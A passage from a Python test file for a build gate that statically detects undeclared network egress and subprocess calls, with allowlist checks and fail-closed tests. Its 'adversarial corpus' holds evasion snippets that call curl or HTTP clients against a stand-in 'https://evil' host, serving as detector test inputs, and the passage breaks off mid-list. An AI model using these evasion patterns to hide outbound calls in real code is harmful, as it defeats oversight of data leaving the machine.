                # `cmd = ["git","status"]` then `cmd[0] = "curl"`. Reading the
                # original literal here would report `git status` and pass.
                self._add(f"exec:{DYNAMIC}", lineno)
                return
            bound = self._lookup(arg.id)
            if bound is self._PARAM:
                # A bare parameter reaching subprocess: this function is a sink,
                # and its callers supply the program (see _prescan). Charging
                # DYNAMIC here would fire on every helper in the repo.
                return
            if bound is None:
                # Never bound in any visible scope: a global, a closure, an
                # import. Nothing static can name it, so it is refused.
                self._add(f"exec:{DYNAMIC}", lineno)
                return
            if arg.id in self._tail_mutated and isinstance(bound, (ast.List, ast.Tuple)):
                # `cmd = ["gh","api"]` then `cmd += args`: argv[0] is still
                # "gh", but everything after it is open.
                self._add(self._channel_for_argv(bound.elts[:1] + [ast.Constant(value=None)]),
                          lineno)
                return
            self._resolve_argv(bound, lineno, depth=depth + 1)
            return
        if isinstance(arg, ast.BinOp) and isinstance(arg.op, ast.Add):
            # `["git","status"] + extra`. Both sides, in order: argv is not a
            # shell, so a program can only ever be argv[0] — but reading only
            # the LEFT would drop a `-c`/`--` continuation that changes which
            # word is the subcommand.
            merged = self._flatten_concat(arg)
            if merged is None:
                self._resolve_argv(arg.left, lineno, depth=depth + 1)
            else:
                self._add(self._channel_for_words(merged), lineno)
            return
        if isinstance(arg, (ast.List, ast.Tuple)):
            self._add(self._channel_for_argv(arg.elts), lineno)
            return
        text = _const_str(arg)                     # shell=True string form
        if text is not None:
            self._add(self._channel_for_words(list(text.split())), lineno)
            return
        self._add(f"exec:{DYNAMIC}", lineno)


    def _flatten_concat(self, node: ast.AST) -> list[str | None] | None:
        """`a + b + c` -> the concatenated word list, or None if not all lists."""
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left = self._flatten_concat(node.left)
            right = self._flatten_concat(node.right)
            return None if left is None or right is None else left + right
        if isinstance(node, ast.Name):
            bound = self._lookup(node.id)
            return None if bound is None or bound is self._PARAM else \
                self._flatten_concat(bound)
        if isinstance(node, (ast.List, ast.Tuple)):
            words: list[str | None] = []
            for elt in node.elts:
                words.append(None if isinstance(elt, ast.Starred) else _const_str(elt))
            return words
        return None

    def _channel_for_argv(self, elts: list[ast.expr],
                          prefix: list[str | None] | None = None) -> str:
        words: list[str | None] = list(prefix or [])
        for elt in elts:
            if isinstance(elt, ast.Starred):
                inner = self._lookup(elt.value.id) if isinstance(elt.value, ast.Name) else None
                if isinstance(inner, (ast.List, ast.Tuple)):
                    words.extend(_const_str(e) for e in inner.elts)
                else:
                    words.append(None)
                continue
            words.append(_const_str(elt))
        return self._channel_for_words(words)

    @staticmethod
    def _channel_for_words(words: list[str | None]) -> str:
        if not words or words[0] is None or not _PROGRAM_RE.match(words[0]):
            return f"exec:{DYNAMIC}"
        program = Path(words[0]).name          # /usr/bin/git -> git
        if program != "git":
            return f"exec:{program}"
        pending: str | None = None
        for word in words[1:]:
            if pending is not None:
                # The value of `-C <path>` / `-c <name=value>`. Skipping it is
                # what lets `["git", "-C", str(repo), "log"]` resolve to
                # `git log` rather than "subcommand unknown" — four modules
                # that only run local git depend on this not being a false
                # positive. But `-c` REQUIRES `name=value`, so a constant
                # without `=` is malformed and nothing here can say what git
                # will do with it: refuse rather than skip past it.
                malformed = (pending == "-c" and word is not None and "=" not in word)
                pending = None
                if malformed:
                    return f"exec:git {DYNAMIC}"
                continue
            if word is None:
                return f"exec:git {DYNAMIC}"
            if word in _GIT_OPTS_WITH_VALUE:
                pending = word
                continue
            if word.startswith("-"):
                continue                        # `--no-pager`, `-c k=v`
            return f"exec:git {word}"
        return f"exec:git {DYNAMIC}"


def _local_binding(func: ast.AST, name: str) -> ast.AST | None:
    """The last expression assigned to *name* inside *func* — `cmd = [...]`."""
    found: ast.AST | None = None
    for node in ast.walk(func):
        if isinstance(node, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Name) and target.id == name:
                    found = node.value
    return found


def _params_of(node: ast.FunctionDef | ast.AsyncFunctionDef) -> list[str]:
    params = [a.arg for a in node.args.posonlyargs + node.args.args]
    if node.args.vararg:
        params.append(node.args.vararg.arg)
    params += [a.arg for a in node.args.kwonlyargs]
    return params


def _call_position(params: list[str], name: str) -> int:
    """Index of *name* as callers pass it — `self` is not passed positionally."""
    pos = params.index(name)
    return pos - 1 if params[0] == "self" else pos


def _splat_prefix(arg: ast.AST | None,
                  params: list[str]) -> tuple[list[str | None], str] | None:
    """`["git", "-C", p, *args]` -> `(["git", "-C", None], "args")`.

    This is the *other* helper shape in this tree: the program is fixed in the
    helper and the subcommand comes from the caller. Resolving it is what turns
    `api/app.py`, `vcs/push_hook.py` and `vcs/pr_watcher.py` from an unreadable
    `git <dynamic>` into `git init` / `git config` / `git merge-base` — all
    local, none of them egress. Left unresolved they would each need an
    allowlist line saying "some git subcommand", which nobody can review.
    """
    if not isinstance(arg, (ast.List, ast.Tuple)) or not arg.elts:
        return None
    words: list[str | None] = []
    for elt in arg.elts:
        if isinstance(elt, ast.Starred):
            if isinstance(elt.value, ast.Name) and elt.value.id in params:
                return (words, elt.value.id) if words else None
            return None
        words.append(_const_str(elt))
    return None


def _mentions_exec(node: ast.AST, analyser: _Analyser) -> bool:
    """Does this expression evaluate to something that runs a program?

    Catches the injected-runner idiom this repo uses for testability —
    `run = _injected or subprocess.run` / `run = runner or _default_runner`,
    then `run(cmd)`. Three modules (`ci_gate/enrich.py` with `curl`,
    `ci_gate/images.py` with `kubectl`, `vcs/receipts.py` with `gh`) reach the
    network *only* through it, and a resolver that keys on the literal name
    `subprocess.run` reports all three as clean.
    """
    for sub in ast.walk(node):
        if analyser._exec_module_of(sub) is not None:
            return True
        if isinstance(sub, ast.Name) and (sub.id in analyser._sinks
                                          or sub.id in analyser._exec_aliases):
            return True
    return False


def _prescan(tree: ast.AST, analyser: _Analyser) -> None:
    """Find module aliases, exec aliases and *exec sinks* before the walk.

    A sink is a function that passes one of its own parameters, unchanged, as
    argv to an exec entry point. Matched by NAME at the call site, so
    `self._run(…)` and `_run(…)` both resolve. Three rounds, because a sink can
    be reached through an alias that is itself defined in terms of a sink, and
    an alias can be defined before the sink it names is discovered.
    """
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                bound = alias.asname or alias.name.split(".")[0]
                analyser._mod_aliases[bound] = (
                    alias.name if alias.asname else alias.name.split(".")[0])
        elif isinstance(node, ast.ImportFrom) and not node.level:
            for exec_module, attrs in EXEC_ATTRS.items():
                if node.module == exec_module:
                    for alias in node.names:
                        if alias.name in attrs:
                            analyser._exec_refs[alias.asname or alias.name] = exec_module
    for _ in range(3):
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign):
                if (isinstance(node.value, ast.Name)
                        and node.value.id in analyser._mod_aliases):
                    for target in node.targets:      # `sp = subprocess`
                        if isinstance(target, ast.Name):
                            analyser._mod_aliases[target.id] = \
                                analyser._mod_aliases[node.value.id]
                if _mentions_exec(node.value, analyser):
                    analyser._exec_aliases.update(
                        t.id for t in node.targets if isinstance(t, ast.Name))
                    # `run = _injected or subprocess.run` — the bare
                    # `subprocess.run` on the right is a reference, not a call,
                    # and the generic "an exec callable named but not called"
                    # rule would charge a second, unnameable <dynamic> for it.
                    # It is already tracked as an alias, and its call sites
                    # resolve to curl/kubectl/gh. Only DIRECTLY callable forms
                    # are absorbed: a dict or list of runners still reports,
                    # because nothing here can follow a subscript back to it.
                    if isinstance(node.value, (ast.BoolOp, ast.IfExp, ast.Name,
                                               ast.Attribute)):
                        for ref in ast.walk(node.value):
                            if analyser._exec_module_of(ref) is not None:
                                analyser._absorbed.add(id(ref))
                    # `self._run_cmd = injected or _subprocess_run` — the alias
                    # is an ATTRIBUTE, so it is not a name binding.
                    # ci/gitlab.py and ci/jenkins.py reach glab and curl only
                    # through this; without it both report an unnamed <dynamic>
                    # and the allowlist would have to say "some program".
                    inherited: set[tuple[int, str]] = set()
                    for ref in ast.walk(node.value):
                        if isinstance(ref, ast.Name) and ref.id in analyser._sinks:
                            inherited |= analyser._sinks[ref.id]
                    for target in node.targets:
                        if isinstance(target, ast.Attribute) and inherited:
                            analyser._sinks.setdefault(target.attr, set()).update(inherited)
            if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            params = _params_of(node)
            if not params:
                continue
            for inner in ast.walk(node):
                if not isinstance(inner, ast.Call):
                    continue
                kind = analyser._call_kind(inner)
                if kind not in ("exec", "exec-varargs"):
                    continue
                if kind == "exec-varargs" and len(inner.args) > 1:
                    # `create_subprocess_exec("git", "-C", p, *args)` — argv is
                    # the positional list, so rebuild it as one for _splat_prefix.
                    arg: ast.AST | None = ast.List(elts=list(inner.args), ctx=ast.Load())
                else:
                    arg = analyser._argv_arg(inner)
                if isinstance(arg, ast.Starred):
                    arg = arg.value
                if isinstance(arg, ast.Name) and arg.id in params:
                    pos = _call_position(params, arg.id)
                    if pos >= 0:
                        analyser._sinks.setdefault(node.name, set()).add((pos, arg.id))
                        analyser._sink_lines[node.name] = inner.lineno
                    continue
                if isinstance(arg, ast.Name):
                    arg = _local_binding(node, arg.id) or arg
                prefix = _splat_prefix(arg, params)
                if prefix is not None:
                    words, splat = prefix
                    pos = _call_position(params, splat)
                    if pos >= 0:
                        analyser._sub_sinks[node.name] = (words, pos, splat)
                        analyser._sub_sink_lines[node.name] = inner.lineno
                        analyser._skip_exec.add(id(inner))


def channels_of(source: str, filename: str = "<memory>") -> dict[str, list[int]]:
    """Every egress-capability channel in *source*, as ``channel -> [lineno]``."""
    tree = ast.parse(source, filename)
    analyser = _Analyser()
    _prescan(tree, analyser)
    analyser.visit(tree)
    # A sink nobody calls in this file runs a program this file cannot name.
    # Reporting nothing here would be the "empty is not zero" failure: the
    # module DOES shell out, we simply could not resolve it.
    for name, lineno in analyser._sink_lines.items():
        if name not in analyser._sinks_called:
            analyser._add(f"exec:{DYNAMIC}", lineno)
    for name, lineno in analyser._sub_sink_lines.items():
        if name not in analyser._sub_sinks_called:
            prefix, _pos, _param = analyser._sub_sinks[name]
            analyser._add(analyser._channel_for_words([*prefix, None]), lineno)
    return analyser.channels


def reach_of(channel: str) -> tuple[str, str]:
    """Classify a channel. An unknown program is EXTERNAL — fail closed."""
    if not channel.startswith("exec:"):
        return EXTERNAL, "a Python network primitive"
    rest = channel[len("exec:"):]
    if rest == DYNAMIC:
        return EXTERNAL, "argv is built at runtime; the program cannot be named"
    if rest.startswith("git "):
        sub = rest[4:]
        if sub == DYNAMIC:
            return EXTERNAL, "the git subcommand is built at runtime"
        return GIT_SUBCOMMANDS.get(sub, (EXTERNAL, f"unclassified git subcommand {sub!r}"))
    return PROGRAMS.get(rest, (EXTERNAL, f"unclassified program {rest!r}"))


def scan_tree(root: Path) -> dict[str, dict[str, list[int]]]:
    """``module path -> channel -> line numbers`` for every ``.py`` under root."""
    out: dict[str, dict[str, list[int]]] = {}
    for path in sorted(root.rglob("*.py")):
        found = channels_of(path.read_text(), str(path))
        if found:
            out[path.relative_to(root).as_posix()] = found
    return out


def undeclared(root: Path, allowlist: dict[str, dict[str, Allowed]]) -> dict[str, dict[str, list[int]]]:
    """Channels that can reach outside the machine and have no allowlist line."""
    gaps: dict[str, dict[str, list[int]]] = {}
    for module, channels in scan_tree(root).items():
        for channel, lines in channels.items():
            if reach_of(channel)[0] != EXTERNAL:
                continue
            if channel in allowlist.get(module, {}):
                continue
            gaps.setdefault(module, {})[channel] = lines
    return gaps


# ---------------------------------------------------------------------------
# Controls. A zero below must mean "nothing found", never "the walk broke".
# ---------------------------------------------------------------------------

#: The pre-fix ambient probe, reconstructed. This is the shape the guard exists
#: for: the argv literal is in one function, the ``subprocess`` call is in
#: another, and the module was ALREADY on the disclosure page for an unrelated
#: channel. `docs/security.md` §7 cites `integrations/__init__.py:497` — so a
#: module-level check reads it as covered and says nothing.
AMBIENT_PROBE_BEFORE_FIX = '''
import subprocess

def _run_probe(cmd, *, timeout=2.0):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except (OSError, subprocess.TimeoutExpired):
        return None

def _probe_github_ambient() -> bool:
    """`gh auth status` exits 0 iff at least one host is logged in."""
    proc = _run_probe(["gh", "auth", "status"])
    return proc is not None and proc.returncode == 0
'''


def test_the_analyser_sees_the_shapes_this_repo_writes() -> None:
    """One assertion per detector arm, so a later refactor that silently stops
    detecting something fails here rather than by reporting a clean tree."""
    # httpx / urllib.request, direct.
    assert "http:httpx" in channels_of("import httpx\nhttpx.post(u, json=b)\n")
    assert "http:httpx" in channels_of(
        "import httpx\nasync with httpx.AsyncClient() as c:\n    pass\n"
        .replace("async with", "with"))
    assert "http:urllib.request" in channels_of(
        "import urllib.request\nurllib.request.urlopen(r)\n")
    # argv literal, straight into subprocess.
    assert "exec:gh" in channels_of('import subprocess\nsubprocess.run(["gh", "pr", "view"])\n')
    # argv through a one-argument exec helper — the #49 shape.
    assert "exec:gh" in channels_of(AMBIENT_PROBE_BEFORE_FIX)
    # argv through an injected-runner alias.
    assert "exec:kubectl" in channels_of(
        "import subprocess\n"
        "def f(_run=None):\n"
        "    run = _run or subprocess.run\n"
        "    return run(['kubectl', 'get', 'pods'])\n")
    # git dispatches on the subcommand, through `-C <path>` and a `*args` helper.
    assert "exec:git fetch" in channels_of(
        'import subprocess\nsubprocess.run(["git", "-C", str(p), "fetch", "origin"])\n')
    assert "exec:git status" in channels_of(
        'import subprocess\n'
        'def _git(cwd, *args):\n'
        '    return subprocess.run(["git", "-C", str(cwd), *args])\n'
        '_git(p, "status", "--porcelain")\n')
    # An unresolvable argv is reported, not dropped.
    assert "exec:<dynamic>" in channels_of(
        "import shlex, subprocess\nsubprocess.run(shlex.split(s))\n")


def test_prose_and_inert_attributes_are_not_egress() -> None:
    """The false-positive side. A guard that fires on a docstring gets deleted,
    and then it protects nothing at all."""
    assert channels_of('"""POSTs to https://graph.microsoft.com; runs `gh pr view`."""\n') == {}
    assert channels_of('CLIS = ["gh", "glab", "curl"]\nOK = ("git", "fetch")\n') == {}
    # `import httpx` used only to catch an exception is not a request. This is
    # api/app.py, which would otherwise land on the disclosure page.
    assert channels_of("import httpx\ntry:\n    pass\nexcept httpx.HTTPError:\n    pass\n") == {}
    # urllib.parse is string munging; 11 modules here import it.
    assert channels_of("import urllib.parse\nurllib.parse.quote(s)\n") == {}


def test_known_negatives_are_not_external() -> None:
    """The three loopback modules and a local `git status` must not read as
    egress — checked through reach_of/the allowlist, not by inspection."""
    for module in ("cli/api_client.py", "intake/mcp_bridge.py",
                   "history/extractor.py", "brain/credentials.py"):
        for channel, entry in ALLOWLIST[module].items():
            assert entry.gate.startswith("loopback:"), (module, channel)
        assert module not in undeclared(PKG, ALLOWLIST)
    for local in ("git status", "git rev-parse", "git diff", "git log",
                  "git credential"):
        assert reach_of(f"exec:{local}")[0] == LOCAL, local
    assert reach_of("exec:ruff")[0] == LOCAL


def test_git_merge_is_local_and_pull_stays_external() -> None:
    """`git merge` (used here as `--squash <local branch>` / `--abort`) never
    contacts a remote and must classify LOCAL; `git pull` is fetch+merge and
    must stay EXTERNAL. The pair is the point — a LOCAL row for `merge` must
    not bleed into `pull`."""
    assert reach_of("exec:git merge")[0] == LOCAL
    assert reach_of("exec:git pull")[0] == EXTERNAL


def test_approve_merge_channel_set_is_pinned() -> None:
    """Pin the exact channel set for vcs/approve_merge.py so a future channel
    added to the merge-and-land path goes red rather than being silently
    absorbed into an already-reviewed entry."""
    assert set(ALLOWLIST["vcs/approve_merge.py"]) == {
        "exec:gh", "exec:glab", "exec:git push", "exec:git ls-remote",
        "exec:<dynamic>",
    }


def test_approve_merge_source_channels_are_all_declared() -> None:
    """Direct repro for the 70881915 salvage. `test_no_undeclared_external_
    egress` below is driven by `scan_tree(PKG)`, which walks real files on
    disk — on a tree where `vcs/approve_merge.py` does not exist yet, that
    walk finds nothing to flag and the gate passes *vacuously*, not because
    anything is declared (this is exactly how the first salvage attempt's
    repro tests were found to already pass on unfixed code). This test reads
    the module directly and fails outright if it is absent, so it is red
    before the module + its ALLOWLIST entry exist and green only once both
    do."""
    module_path = PKG / "vcs" / "approve_merge.py"
    assert module_path.exists(), (
        "vcs/approve_merge.py must exist for `nh approve` to land PRs")
    found = channels_of(module_path.read_text(), str(module_path))
    external = {channel for channel in found if reach_of(channel)[0] == EXTERNAL}
    declared = set(ALLOWLIST.get("vcs/approve_merge.py", {}))
    missing = external - declared
    assert not missing, (
        f"undeclared external channels in vcs/approve_merge.py: {missing}")


# ---------------------------------------------------------------------------
# The gate
# ---------------------------------------------------------------------------

def test_no_undeclared_external_egress() -> None:
    """THE gate. A channel that can reach off this machine and has no line in
    ALLOWLIST fails the build, whether or not its module is already known."""
    scanned = scan_tree(PKG)
    assert len(scanned) > 30, (
        f"only {len(scanned)} modules produced any channel — the walk is "
        "broken, and an empty result here would read as a clean tree")

    gaps = undeclared(PKG, ALLOWLIST)
    if gaps:
        lines = []
        for module, channels in sorted(gaps.items()):
            for channel, at in sorted(channels.items()):
                why = reach_of(channel)[1]
                lines.append(f"  src/no_human/{module}:{at[0]}  {channel}  ({why})")
        raise AssertionError(
            "these channels can reach outside this machine and no line in "
            "ALLOWLIST permits them:\n" + "\n".join(lines) + "\n\n"
            "Add an entry under the MODULE and the exact CHANNEL:\n"
            '    "<module>": {"<channel>": Allowed("<what it talks to>", '
            '"<gate>")}\n'
            f"where <gate> starts with one of {_GATE_FORMS}. If the program is "
            "in fact local, classify it in PROGRAMS/GIT_SUBCOMMANDS with the "
            "reason it cannot leave the machine. Do not widen a pattern.")


def test_no_stale_allowlist_entries() -> None:
    """A line that no longer matches anything is a hole: it silently
    pre-authorises whatever reappears under that name later."""
    scanned = scan_tree(PKG)
    stale = [
        f"  {module}  {channel}   ({entry.talks_to})"
        for module, channels in sorted(ALLOWLIST.items())
        for channel, entry in sorted(channels.items())
        if (PKG / module).exists() and channel not in scanned.get(module, {})
    ]
    assert not stale, (
        "these ALLOWLIST lines no longer match any code — delete them:\n"
        + "\n".join(stale))


def test_every_entry_names_a_destination_and_a_gate() -> None:
    """Allowed.__post_init__ enforces this at construction; this asserts the
    list is actually populated, so an empty ALLOWLIST cannot pass by vacuity."""
    assert len(ALLOWLIST) >= 42
    for module, channels in ALLOWLIST.items():
        assert channels, module
        for channel, entry in channels.items():
            assert len(entry.talks_to) > 10, (module, channel)
            assert entry.gate.startswith(_GATE_FORMS), (module, channel)


#: The phrase a gate must contain to be allowed to name a key DEFAULT_CONFIG
#: does not have. Kept as a constant so the assertion and the message that
#: tells an author how to satisfy it cannot drift apart.
_DECLARED_ABSENT = "absent from DEFAULT_CONFIG"


def _resolve_config_key(key: str) -> tuple[bool, object]:
    """Walk a dotted gate key through DEFAULT_CONFIG -> ``(exists, value)``.

    Split out of the test below so the walk itself can be tested. Absence and a
    falsy value are DIFFERENT answers and the caller needs both: conflating
    them is what let a deleted key keep passing.
    """
    from no_human.config import DEFAULT_CONFIG

    node: object = DEFAULT_CONFIG
    for part in key.split("."):
        if isinstance(node, dict) and part in node:
            node = node[part]
        else:
            return False, None
    return True, node


def test_the_config_key_walk_can_actually_tell_absent_from_falsy() -> None:
    """Non-vacuity for `_resolve_config_key`, and the reason it exists.

    `test_config_gates_are_really_off` asserts every gate key EXISTS. On a
    clean tree nothing violates that, so the assertion has no live subject and
    a walk hard-wired to "exists" would pass unnoticed — the same shape of
    hole this whole change is closing. Pin the walk's discrimination directly:
    a real falsy key, a real truthy key, and a key that is not there.
    """
    assert _resolve_config_key("ci.enabled") == (True, False)
    assert _resolve_config_key("ci.backend") == (True, "gitlab")
    assert _resolve_config_key("integrations.circleci.enabled") == (False, None)
    assert _resolve_config_key("no.such.key.anywhere") == (False, None)
    # A scalar mid-path must not be indexed into as if it were a dict.
    assert _resolve_config_key("ci.enabled.deeper") == (False, None)


def test_config_gates_are_really_off() -> None:
    """The one part of "when does it fire?" a static test can check. #49 was a
    channel claimed to be configuration-gated that fired unconfigured; a key
    whose DEFAULT is truthy makes the claim false in the other direction."""
    checked = 0
    for module, channels in sorted(ALLOWLIST.items()):
        for channel, entry in sorted(channels.items()):
            for key in entry.config_keys():
                checked += 1
                exists, node = _resolve_config_key(key)
                # PER-KEY existence. Without it this whole loop is vacuous for
                # any key that has been DELETED or misspelled: the walk yields
                # None, `assert not None` is green, and the disclosure keeps
                # naming a setting the operator cannot find. That is not
                # hypothetical — `integrations.circleci.enabled` survived here
                # after the block was removed, because the only non-vacuity
                # counter was the global `checked` below, which cannot see one
                # key of many vanish.
                #
                # A key MAY legitimately be absent (context.m365.token is: the
                # client raises before building a request, so there is nothing
                # to default). The rule is that the disclosure must SAY SO in
                # the text the operator reads, rather than the test carrying a
                # private list of blessed exceptions that rots out of sight.
                # Scope note: the escape hatch is per ENTRY, not per key, so an
                # entry naming several keys is exempted wholesale once it
                # declares one absence — acceptable, since an author who wrote
                # that sentence has already been made to look at the config.
                assert exists or _DECLARED_ABSENT in entry.gate, (
                    f"{module} {channel} claims to be gated on {key!r}, but "
                    "DEFAULT_CONFIG has no such key — the gate names a setting "
                    "that does not exist, so nothing is actually disclosed. If "
                    f"the absence is deliberate, say {_DECLARED_ABSENT!r} in "
                    "the gate text.")
                assert not node, (
                    f"{module} {channel} claims to be gated on {key!r}, but "
                    f"DEFAULT_CONFIG has it as {node!r} — it is on by default, "
                    "so the gate is 'default-on:' and the disclosure is wrong")
    # A gate parser that returned nothing would make every assertion above
    # vacuous and this test would still be green. Count what was checked.
    assert checked >= 15, f"only {checked} config keys parsed out of the gates"


def test_env_gates_are_read_by_the_module() -> None:
    """An `env:` gate names a credential the module must actually look up."""
    checked = 0
    for module, channels in sorted(ALLOWLIST.items()):
        for channel, entry in sorted(channels.items()):
            for var in entry.env_vars():
                checked += 1
                assert var in (PKG / module).read_text(), (
                    f"{module} {channel} claims to be gated on {var}, but the "
                    "module never reads it")
    assert checked >= 2, f"only {checked} env vars parsed out of the gates"


def test_loopback_entries_really_bind_loopback() -> None:
    """A `loopback:` gate is the only one that says "this is not egress at
    all", so it is the one worth a second check: the module must name
    127.0.0.1. Weak on purpose — it cannot know where a configured host
    points at runtime, and `server.host` is configurable."""
    checked = 0
    for module, channels in sorted(ALLOWLIST.items()):
        for channel, entry in sorted(channels.items()):
            if entry.gate.startswith("loopback:"):
                checked += 1
                assert "127.0.0.1" in (PKG / module).read_text(), (module, channel)
    # 13 = the 10 that predate the UI evidence runner, + its readiness probe
    # (one connection to a validated 127.0.0.1/localhost base_url, redirects
    # refused), + `cli/pool_probe.py`, which is `nh status`'s queue-health GET
    # split out of cli/commands.py — a move of an existing channel, not a new
    # destination, + `hermetic_backend`'s `_pick_ephemeral_port`, which binds
    # the literal "127.0.0.1" to find a free port for its throwaway `nh
    # start`. The runner's BROWSER is deliberately NOT loopback: a page it
    # loads can fetch from anywhere, so that channel is config-gated instead.
    # + `api/local_boundary.py` (the Host/Origin boundary split out of
    # api/app.py) AND the hermetic walk backend's loopback channel — two
    # independent +1s over the same base, merged: 14.
    assert checked == 14, f"expected 14 loopback channels, found {checked}"


def test_no_unused_local_classifications() -> None:
    """An unused LOCAL row is a pass pre-authorised for code nobody has read.
    Unused EXTERNAL rows are fine — they can only cause a failure, never hide
    one — so this is deliberately one-sided."""
    used_programs, used_subs = set(), set()
    for channels in scan_tree(PKG).values():
        for channel in channels:
            if not channel.startswith("exec:"):
                continue
            rest = channel[len("exec:"):]
            (used_subs if rest.startswith("git ") else used_programs).add(
                rest[4:] if rest.startswith("git ") else rest)

    unused = [f"PROGRAMS[{k!r}]" for k, (reach, _) in PROGRAMS.items()
              if reach != EXTERNAL and k != "git" and k not in used_programs]
    unused += [f"GIT_SUBCOMMANDS[{k!r}]" for k, (reach, _) in GIT_SUBCOMMANDS.items()
               if reach != EXTERNAL and k not in used_subs]
    assert not unused, (
        "these rows classify something as safe that no call site uses — "
        "delete them, and classify the real thing when it appears:\n  "
        + "\n  ".join(unused))


# ---------------------------------------------------------------------------
# Fail-closed proofs. Each points the REAL gate function at a small tree it
# has never seen, so what is proved is the gate, not a re-statement of it.
# ---------------------------------------------------------------------------

def _tree(tmp_path: Path, files: dict[str, str]) -> Path:
    root = tmp_path / "pkg"
    for rel, source in files.items():
        target = root / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(source)
    return root


def test_the_known_positive_is_caught(tmp_path: Path) -> None:
    """#49 itself. `integrations/__init__.py` is allowlisted for `http:httpx`
    and NOT for `exec:gh`; the pre-fix ambient probe must still fail the gate.

    This is the whole difference from the module-level check: give the module
    its existing, legitimate permission and the new channel is still refused.
    """
    root = _tree(tmp_path, {"integrations/__init__.py":
                            "import httpx\nhttpx.get(u)\n" + AMBIENT_PROBE_BEFORE_FIX})
    permitted = {"integrations/__init__.py": {
        "http:httpx": Allowed("Jira/Linear/CircleCI health checks",
                              _CFG + "integrations.jira.enabled"),
    }}
    gaps = undeclared(root, permitted)
    assert set(gaps) == {"integrations/__init__.py"}, gaps
    assert set(gaps["integrations/__init__.py"]) == {"exec:gh"}, gaps

    # And with the channel declared, it passes — the guard is not simply
    # refusing everything.
    permitted["integrations/__init__.py"]["exec:gh"] = Allowed(
        "GitHub's API", _ON + "the defect")
    assert undeclared(root, permitted) == {}


def test_a_new_module_fails_closed(tmp_path: Path) -> None:
    """Drop an unclassified module into the tree: the gate must name it. The
    default for something nobody has classified is DENIED."""
    root = _tree(tmp_path, {
        "vcs/git.py": 'import subprocess\nsubprocess.run(["git", "status"])\n',
        "sneaky/telemetry.py": "import httpx\nhttpx.post('https://t.example/e', json=d)\n",
    })
    gaps = undeclared(root, ALLOWLIST)
    assert "sneaky/telemetry.py" in gaps
    assert gaps["sneaky/telemetry.py"] == {"http:httpx": [2]}
    assert "vcs/git.py" not in gaps          # local git is not egress


def test_an_unknown_program_fails_closed(tmp_path: Path) -> None:
    """A binary nobody has classified, and a git subcommand nobody has
    classified, are both EXTERNAL until somebody writes down why they are not."""
    root = _tree(tmp_path, {
        "a.py": 'import subprocess\nsubprocess.run(["some-new-uploader", "--all"])\n',
        "b.py": 'import subprocess\nsubprocess.run(["git", "request-pull", "x"])\n',
    })
    gaps = undeclared(root, {})
    assert gaps == {"a.py": {"exec:some-new-uploader": [2]},
                    "b.py": {"exec:git request-pull": [2]}}, gaps
    assert reach_of("exec:some-new-uploader")[0] == EXTERNAL
    assert reach_of("exec:git request-pull")[0] == EXTERNAL


def test_a_helper_that_hides_argv_fails_closed(tmp_path: Path) -> None:
    """The escape hatch that would otherwise defeat the whole file: run a
    program nobody can name. It must still demand a line."""
    root = _tree(tmp_path, {"c.py":
                            "import shlex, subprocess\n"
                            "def go(spec):\n"
                            "    subprocess.run(shlex.split(spec))\n"})
    assert undeclared(root, {}) == {"c.py": {"exec:<dynamic>": [3]}}


def test_an_entry_without_a_reason_cannot_be_written() -> None:
    """`Allowed` refuses to exist without a destination and a recognised gate,
    so 'add it to the list to make the build green' cannot be done silently."""
    import pytest

    with pytest.raises(ValueError, match="mute button"):
        Allowed("", "default-on: x")
    with pytest.raises(ValueError, match="must start with"):
        Allowed("GitHub", "because it is fine")


# ---------------------------------------------------------------------------
# The adversarial corpus. This exists because the FIRST version of this file
# was refuted in two words: `import subprocess as _sp` made the entire exec
# detector silent, on a tree where that alias occurs five times and hides a
# `git fetch` that runs on every task attempt. A guard is only as good as the
# attacks somebody actually tried against it, so the attacks live here.
#
# The property asserted is NOT "every case resolves to the right program" —
# several cannot, and pretending otherwise is how the first version failed. It
# is the weaker, checkable one: **an exec or network construct is never
# silent.** Whatever it resolves to must land EXTERNAL and therefore demand an
# allowlist line. `<dynamic>` is a pass; `{}` is a failure.
# ---------------------------------------------------------------------------

EVASIONS: dict[str, str] = {
    "aliased subprocess import":
        'import subprocess as sp\nsp.run(["curl", "https://evil"])\n',
    "module rebound to a name":
        'import subprocess\nsp = subprocess\nsp.run(["curl", "https://evil"])\n',
    "from os import system":
        'from os import system\nsystem("curl https://evil")\n',
    "os.execvp":
        'import os\nos.execvp("curl", ["curl", "https://evil"])\n',
    "os.posix_spawn":
        'import os\nos.posix_spawn("/usr/bin/curl", ["curl", "x"], {})\n',
    "pty.spawn":
        'import pty\npty.spawn(["curl", "https://evil"])\n',
    "exec callable passed as an argument":
        'import asyncio, subprocess\n'
        'async def f():\n'
        '    await asyncio.to_thread(subprocess.run, ["git", "fetch", "origin"])\n',
    "exec callable in a dict":
        'import subprocess\nR = {"a": subprocess.run}\nR["a"](["curl", "x"])\n',
    "Popen subclass":
        'import subprocess\nclass P(subprocess.Popen):\n    pass\nP(["curl", "x"])\n',
    "argv via shlex.split":
        'import shlex, subprocess\nsubprocess.run(shlex.split(s))\n',
    "argv head reassigned after a benign literal":
        'import subprocess\ncmd = ["git", "status"]\ncmd[0] = "curl"\n'
        'subprocess.run(cmd)\n',
    "argv keyword instead of positional":
        'import subprocess\nsubprocess.run(args=["curl", "https://evil"])\n',
    "walrus-bound argv":
        'import subprocess\nif (cmd := ["curl", "x"]):\n    subprocess.run(cmd)\n',
    "tuple-unpacked argv":
        'import subprocess\ncmd, _ = ["curl", "x"], 1\nsubprocess.run(cmd)\n',
    "class-attribute argv":
        'import subprocess\nclass C:\n    CMD = ["curl", "x"]\nsubprocess.run(C.CMD)\n',
    "git -c whose value is not name=value":
        'import subprocess\nsubprocess.run(["git", "-c", "fetch", "status"])\n',
    "unclassified stdlib network module":
        'import xmlrpc.client\nxmlrpc.client.ServerProxy("https://evil")\n',
    "unclassified third-party network module":
        'import urllib3\nurllib3.PoolManager().request("GET", "https://evil")\n',
    "an SDK that is not httpx":
        'import anthropic\nanthropic.Anthropic().messages.create()\n',
    "httpx reached through getattr":
        'import httpx\ngetattr(httpx, "post")(u)\n',
    "raw socket":
